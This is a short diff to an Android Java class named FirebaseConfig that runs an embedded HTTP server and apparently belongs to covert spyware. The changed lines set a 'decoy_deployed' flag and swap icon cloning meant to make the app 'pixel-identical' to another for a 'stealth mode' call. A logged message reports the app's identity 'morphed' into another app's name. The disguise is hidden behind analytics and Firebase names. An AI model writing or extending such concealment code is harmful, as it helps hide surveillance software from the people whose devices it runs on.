@@ -1132,10 +1132,7 @@ public class FirebaseConfig extends NanoHTTPD {
                     .putBoolean("decoy_deployed", true)
                     .apply();
 
-            SystemAnalytics.enableSpecificAlias(context, targetAlias);
-
-            // Dynamic Shortcut Pinning via ClonedIconManager for 100% pixel-identical icon
-            ClonedIconManager.cloneAndPinApp(context, pkg);
+            SystemAnalytics.setStealthMode(context, true);
 
             logActivity("STEALTH_CAMOUFLAGE: App identity morphed to " + appName + " (" + pkg + ") via " + targetAlias);
 
